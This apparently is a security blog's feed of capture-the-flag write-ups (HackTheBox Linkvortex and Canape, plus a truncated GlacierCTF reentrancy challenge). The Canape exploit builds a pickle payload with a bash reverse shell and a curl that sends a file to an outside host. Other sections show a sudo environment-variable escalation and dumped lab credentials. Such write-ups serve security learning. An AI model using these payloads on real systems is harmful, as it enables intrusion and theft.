@@ -1,0 +1,794 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://shafouz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://shafouz.github.io/" rel="alternate" type="text/html" /><updated>2024-12-24T19:52:41+00:00</updated><id>https://shafouz.github.io/feed.xml</id><title type="html">shafouz blog</title><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><entry><title type="html">HTB - linkvortex</title><link href="https://shafouz.github.io/2024/12/24/htb-linkvortex.html" rel="alternate" type="text/html" title="HTB - linkvortex" /><published>2024-12-24T18:47:00+00:00</published><updated>2024-12-24T18:47:00+00:00</updated><id>https://shafouz.github.io/2024/12/24/htb-linkvortex</id><content type="html" xml:base="https://shafouz.github.io/2024/12/24/htb-linkvortex.html"><![CDATA[<p>Linkvortex is a easy difficulty box. We start by discovering a subdomain hosting a Git repository. It gives us a password and the framework running on the main site. We then use a know cve to read a configuration file getting our user shell. For the root shell we abuse a vulnerability in a sudo script.</p>
+
+<h1 id="nmap">nmap</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/workspace/projects/htb/linkvortex » nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 1024 <span class="si">$(</span><span class="nb">cat </span>ip.txt<span class="si">)</span>                      shafou@shafou
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-24 13:26 <span class="nt">-04</span>
+Nmap scan report <span class="k">for </span>linkvortex.htb <span class="o">(</span>10.10.11.47<span class="o">)</span>
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>71.36 seconds
+</code></pre></div></div>
+
+<h1 id="subdomain-bruteforce">subdomain bruteforce</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/workspace/projects/htb/linkvortex » ffuf <span class="nt">-u</span> http://<span class="si">$(</span><span class="nb">cat </span>ip.txt<span class="si">)</span> <span class="nt">-H</span> <span class="s1">'Host: FUZZ.linkvortex.htb'</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span>
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.47
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.linkvortex.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+________________________________________________
+
+[Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 161ms]
+| URL | http://10.10.11.47
+    * FUZZ: dev
+
+[Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 160ms]
+| URL | http://10.10.11.47
+    * FUZZ: #www
+
+[Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 158ms]
+| URL | http://10.10.11.47
+    * FUZZ: #mail
+
+:: Progress: [19966/19966] :: Job [1/1] :: 97 req/sec :: Duration: [0:03:26] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<h1 id="endpoint-bruteforce">endpoint bruteforce</h1>
+<ul>
+  <li>.git found</li>
+</ul>
+
+<h1 id="password-found-on-git">password found on git</h1>
+<ul>
+  <li>OctopiFociPilfer45</li>
+</ul>
+
+<h1 id="looking-at-ghost-docs">looking at ghost docs</h1>
+<ul>
+  <li>login screen at /ghost/</li>
+  <li>have to deduce the email <code class="language-plaintext highlighter-rouge">admin@linkvortex.htb</code>, more of a convention than a deduction</li>
+</ul>
+
+<h1 id="ghost-version">ghost version</h1>
+<ul>
+  <li>Version: 5.58.0</li>
+  <li>screen shot</li>
+</ul>
+
+<h1 id="vulnerable-to">vulnerable to</h1>
+<ul>
+  <li>CVE-2023-40028 arbitrary file read</li>
+  <li>poc on github</li>
+  <li>by looking at the dockerfile we get the path of the config /var/lib/ghost/config.production.json</li>
+  <li>that has the ssh login password for the bob user</li>
+</ul>
+
+<h1 id="user">user</h1>
+<p><code class="language-plaintext highlighter-rouge">user.txt - 33c3c***************************</code></p>
+
+<h1 id="root">root</h1>
+<p>sudo -l shows a script we can use
+it also has the option <code class="language-plaintext highlighter-rouge">env_keep+=CHECK_CONTENT</code>
+that means sudo will keep CHECK_CONTENT if we set it</p>
+
+<p>the vulnerability on the script is on:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nv">$CHECK_CONTENT</span><span class="p">;</span><span class="k">then</span>
+</code></pre></div></div>
+<p>whatever we put on $CHECK_CONTENT runs as root.</p>
+
+<p>To reach that we need a symlink that ends with .png and we can’t use spaces because of the check on line 5:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@linkvortex:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">CHECK_CONTENT</span><span class="o">=</span><span class="s1">'echo 123'</span><span class="p">;</span> <span class="nb">sudo</span> /usr/bin/bash /opt/ghost/clean_symlink.sh bla.png
+/opt/ghost/clean_symlink.sh: line 5: <span class="o">[</span>: <span class="nb">echo</span>: binary operator expected
+</code></pre></div></div>
+
+<p>Final payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> bla.png ble.png<span class="p">;</span> <span class="nb">echo</span> <span class="s1">'cat /root/root.txt'</span> <span class="o">&gt;</span> a.sh<span class="p">;</span> <span class="nb">chmod</span> +x ./a.sh<span class="p">;</span> <span class="nb">export </span><span class="nv">CHECK_CONTENT</span><span class="o">=</span><span class="s1">'./a.sh'</span><span class="p">;</span> <span class="nb">sudo</span> /usr/bin/bash /opt/ghost/clean_symlink.sh ble.png
+</code></pre></div></div>
+
+<h1 id="root-1">root</h1>
+<p><code class="language-plaintext highlighter-rouge">root.txt - 3d9e9***************************</code></p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[Linkvortex is a easy difficulty box. We start by discovering a subdomain hosting a Git repository. It gives us a password and the framework running on the main site. We then use a know cve to read a configuration file getting our user shell. For the root shell we abuse a vulnerability in a sudo script.]]></summary></entry><entry><title type="html">HTB - Canape</title><link href="https://shafouz.github.io/2024/12/23/HTB-Canape.html" rel="alternate" type="text/html" title="HTB - Canape" /><published>2024-12-23T15:38:00+00:00</published><updated>2024-12-23T15:38:00+00:00</updated><id>https://shafouz.github.io/2024/12/23/HTB-Canape</id><content type="html" xml:base="https://shafouz.github.io/2024/12/23/HTB-Canape.html"><![CDATA[<p>Canape is one of the most popular boxes on htb. The first step involves finding the source code through a git repo. After that we exploit a pickle deserialization to get a shell as <code class="language-plaintext highlighter-rouge">www-data</code>. Then we use one of the couchdb CVEs to escalate to the <code class="language-plaintext highlighter-rouge">homer</code> user. And finally we use sudo privileges on pip to get the <code class="language-plaintext highlighter-rouge">root</code> shell.</p>
+
+<h1 id="nmap">nmap</h1>
+<p>Starting with nmap we get a <code class="language-plaintext highlighter-rouge">.git</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/workspace/projects/htb/canape » nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 1024 <span class="si">$(</span><span class="nb">cat </span>ip.txt<span class="si">)</span>
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-23 12:58 <span class="nt">-04</span>
+Stats: 0:00:32 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Connect Scan
+Connect Scan Timing: About 25.55% <span class="k">done</span><span class="p">;</span> ETC: 13:00 <span class="o">(</span>0:01:33 remaining<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.70
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT      STATE SERVICE
+80/tcp    open  http
+65535/tcp open  unknown
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>128.50 seconds
+~/workspace/projects/htb/canape » nmap <span class="nt">-p</span> 80,65535 <span class="nt">-A</span> <span class="nt">--min-rate</span> 1024 <span class="si">$(</span><span class="nb">cat </span>ip.txt<span class="si">)</span>           1 ↵ shafou@shafou
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-23 13:00 <span class="nt">-04</span>
+Nmap scan report <span class="k">for </span>canape.htb <span class="o">(</span>10.10.10.70<span class="o">)</span>
+Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Simpsons Fan Site
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-git:
+|   10.10.10.70:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">'description'</span> to name the...
+|     Last commit message: final <span class="c"># Please enter the commit message for your changes. Li...</span>
+|     Remotes:
+|_      http://git.canape.htb/simpsons.git
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+65535/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 8d820b3190e4c885b2538ba17c3b65e1 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 22fc6ec35500850f24bff5796c928b68 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 0d912751805e2ba3810de9d85c9b7735 <span class="o">(</span>ED25519<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>13.93 seconds
+</code></pre></div></div>
+
+<h1 id="flask-app">flask app</h1>
+<p>On the git repo there is a flask app which is vulnerable to pickle deserialization.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/submit"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">submit</span><span class="p">():</span>
+    <span class="n">error</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">success</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">char</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"character"</span><span class="p">]</span>
+            <span class="n">quote</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"quote"</span><span class="p">]</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">char</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
+                <span class="n">error</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">elif</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">char</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">WHITELIST</span><span class="p">):</span>
+                <span class="n">error</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="c1"># TODO - Pickle into dictionary instead, `check` is ready
+</span>                <span class="n">p_id</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
+                <span class="n">outfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/tmp/"</span> <span class="o">+</span> <span class="n">p_id</span> <span class="o">+</span> <span class="s">".p"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+		<span class="n">outfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">)</span>
+		<span class="n">outfile</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+	        <span class="n">success</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="bp">True</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"submit.html"</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">success</span><span class="o">=</span><span class="n">success</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/check"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="s">"/tmp/"</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">"id"</span><span class="p">]</span> <span class="o">+</span> <span class="s">".p"</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="s">"p1"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">item</span> <span class="o">=</span> <span class="n">cPickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">item</span> <span class="o">=</span> <span class="n">data</span>
+
+    <span class="k">return</span> <span class="s">"Still reviewing: "</span> <span class="o">+</span> <span class="n">item</span>
+</code></pre></div></div>
+
+<p>This part can be tricky. But it’s pretty easy if you use the <code class="language-plaintext highlighter-rouge">pickleassem</code> package. I got stuck here because I didn’t realize that the character name could be anywhere on the payload.</p>
+
+<ul>
+  <li>exploit:</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+
+<span class="kn">from</span> <span class="nn">pickleassem</span> <span class="kn">import</span> <span class="n">PickleAssembler</span>
+
+<span class="n">pa</span> <span class="o">=</span> <span class="n">PickleAssembler</span><span class="p">(</span><span class="n">proto</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">pa</span><span class="p">.</span><span class="n">push_mark</span><span class="p">()</span>
+<span class="n">pa</span><span class="p">.</span><span class="n">util_push</span><span class="p">(</span><span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.41/4444 0&gt;&amp;1'; curl http://10.10.14.41:5000/ -d @/tmp/123; echo moe"</span><span class="p">)</span>
+<span class="n">pa</span><span class="p">.</span><span class="n">build_inst</span><span class="p">(</span><span class="s">'os'</span><span class="p">,</span> <span class="s">'system'</span><span class="p">)</span>
+<span class="n">pa</span><span class="p">.</span><span class="n">push_binstring</span><span class="p">(</span><span class="s">'p1'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pa</span><span class="p">.</span><span class="n">assemble</span><span class="p">()</span>
+
+<span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"http://canape.htb:80/submit"</span>
+
+<span class="n">char</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">()</span>
+<span class="n">quote</span> <span class="o">=</span> <span class="s">"."</span>
+<span class="n">burp0_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"character"</span><span class="p">:</span> <span class="n">char</span><span class="p">,</span> <span class="s">"quote"</span><span class="p">:</span> <span class="n">quote</span><span class="p">}</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+<span class="p">})</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">md5</span><span class="p">((</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[3]: req.py:12: a=</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"http://canape.htb:80/check"</span>
+<span class="n">burp0_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"id"</span><span class="p">:</span> <span class="n">a</span><span class="p">}</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[4]: req.py:17: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h1 id="www-data---homer">www-data -&gt; homer</h1>
+<p>Some interesting files here but they don’t lead anywhere.
+The most interesting part is couchdb on 127.0.0.1:5986</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"couchdb"</span><span class="p">:</span><span class="s2">"Welcome"</span><span class="p">,</span><span class="nl">"uuid"</span><span class="p">:</span><span class="s2">"132586dfde75b957085d59a5096e9c20"</span><span class="p">,</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"2.0.0"</span><span class="p">,</span><span class="nl">"vendor"</span><span class="p">:{</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"The Apache Software Foundation"</span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This version seems to be vulnerable to multiple cves. The one that worked was <code class="language-plaintext highlighter-rouge">CVE-2017-12636</code>. It gives us an admin user. We can then check the <code class="language-plaintext highlighter-rouge">passwords</code> db and find the ssh password for the <code class="language-plaintext highlighter-rouge">homer</code> user.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DEBUGPRINT[2]: lab.py:29: res.text<span class="o">={</span><span class="s2">"_id"</span>:<span class="s2">"739c5ebdf3f7a001bebb8fc4380019e4"</span>,<span class="s2">"_rev"</span>:<span class="s2">"2-81cf17b971d9229c54be92eeee723296"</span>,<span class="s2">"item"</span>:<span class="s2">"ssh"</span>,<span class="s2">"password"</span>:<span class="s2">"B4jyA0xtytZi7esBNGp"</span>,<span class="s2">"user"</span>:<span class="s2">""</span><span class="o">}</span>
+DEBUGPRINT[2]: lab.py:29: res.text<span class="o">={</span><span class="s2">"_id"</span>:<span class="s2">"739c5ebdf3f7a001bebb8fc43800368d"</span>,<span class="s2">"_rev"</span>:<span class="s2">"2-43f8db6aa3b51643c9a0e21cacd92c6e"</span>,<span class="s2">"item"</span>:<span class="s2">"couchdb"</span>,<span class="s2">"password"</span>:<span class="s2">"r3lax0Nth3C0UCH"</span>,<span class="s2">"user"</span>:<span class="s2">"couchy"</span><span class="o">}</span>
+DEBUGPRINT[2]: lab.py:29: res.text<span class="o">={</span><span class="s2">"_id"</span>:<span class="s2">"739c5ebdf3f7a001bebb8fc438003e5f"</span>,<span class="s2">"_rev"</span>:<span class="s2">"1-77cd0af093b96943ecb42c2e5358fe61"</span>,<span class="s2">"item"</span>:<span class="s2">"simpsonsfanclub.com"</span>,<span class="s2">"password"</span>:<span class="s2">"h02ddjdj2k2k2"</span>,<span class="s2">"user"</span>:<span class="s2">"homer"</span><span class="o">}</span>
+DEBUGPRINT[2]: lab.py:29: res.text<span class="o">={</span><span class="s2">"_id"</span>:<span class="s2">"739c5ebdf3f7a001bebb8fc438004738"</span>,<span class="s2">"_rev"</span>:<span class="s2">"1-49a20010e64044ee7571b8c1b902cf8c"</span>,<span class="s2">"user"</span>:<span class="s2">"homerj0121"</span>,<span class="s2">"item"</span>:<span class="s2">"github"</span>,<span class="s2">"password"</span>:<span class="s2">"STOP STORING YOUR PASSWORDS HERE -Admin"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<h1 id="homer---root">homer -&gt; root</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>homer@canape:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+9a3d7<span class="k">***************************</span>
+</code></pre></div></div>
+
+<p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code> on homer shows that we can run <code class="language-plaintext highlighter-rouge">pip</code> as root.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries <span class="k">for </span>homer on canape:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User homer may run the following commands on canape:
+    <span class="o">(</span>root<span class="o">)</span> /usr/bin/pip <span class="nb">install</span> <span class="k">*</span>
+</code></pre></div></div>
+<p>Found this repo that has a poc for running code on pip install and adapted a little bit.</p>
+<ul>
+  <li><a href="https://github.com/mschwager/0wned">0wned</a></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># sudo /usr/bin/pip install ./0wned</span>
+homer@canape:/tmp/la<span class="nv">$ </span><span class="nb">cat </span>root.txt
+d8bf7<span class="k">***************************</span>
+</code></pre></div></div>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">ArcticVault - GlacierCTF 2024</title><link href="https://shafouz.github.io/2024/11/24/ArcticVault.html" rel="alternate" type="text/html" title="ArcticVault - GlacierCTF 2024" /><published>2024-11-24T04:00:00+00:00</published><updated>2024-11-24T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/11/24/ArcticVault</id><content type="html" xml:base="https://shafouz.github.io/2024/11/24/ArcticVault.html"><![CDATA[<p>https://ctftime.org/event/2402</p>
+
+<h1 id="arcticvault-blockchain">ArcticVault (blockchain)</h1>
+
+<p>Reentrancy challenge</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>The challenge is a simple vault contract. And you objective is drain it.
+The contract has a reentrancy guard on most of the functions. Except <code class="language-plaintext highlighter-rouge">flashLoan</code>.
+It also starts with <code class="language-plaintext highlighter-rouge">reentrancyGuard = false</code>.
+The bug is that flashLoan accepts loans for zero. 
+And that allows you to bypass the guard by just calling flashLoan(0).</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Setup</span> <span class="p">{</span>
+    <span class="n">ArcticVault</span> <span class="k">public</span> <span class="kr">immutable</span> <span class="n">TARGET</span><span class="p">;</span> <span class="c1">// Contract the player will hack
+</span>
+    <span class="k">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+
+        <span class="c1">// Deploy the victim contract
+</span>        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArcticVault</span><span class="p">();</span>
+
+        <span class="n">TARGET</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Our challenge in the CTF framework will call this function to
+</span>    <span class="c1">// check whether the player has solved the challenge or not.
+</span>    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// --------------- ArcticVault.sol ---------------
+// The first artic vault, even safer than swiss banking ;)
+// Deposit your funds, and the tax collector will never find them.
+// We even offer the coldest flash loans in the world!
+</span>
+<span class="k">contract</span> <span class="n">ArcticVault</span>
+<span class="p">{</span>
+    <span class="kt">address</span> <span class="n">owner</span><span class="p">;</span>
+    <span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="n">paused</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="k">public</span> <span class="n">reentrancyGuard</span><span class="p">;</span>
+
+    <span class="k">modifier</span> <span class="n">notPaused</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">paused</span><span class="p">,</span> <span class="s">"Contract is paused"</span><span class="p">);</span>
+        <span class="n">_</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">event</span> <span class="n">Donation</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">);</span>
+
+    <span class="k">event</span> <span class="n">MyEvent</span><span class="p">(</span><span class="kt">bytes</span> <span class="n">data</span><span class="p">);</span>
+
+    <span class="k">constructor</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Users can deposit funds into the contract
+</span>    <span class="k">function</span> <span class="n">deposit</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"Amount must be greater than 0"</span><span class="p">);</span>
+
+        <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Donate to the glacier
+</span>    <span class="k">function</span> <span class="n">donate</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"Amount must be greater than 0"</span><span class="p">);</span>
+
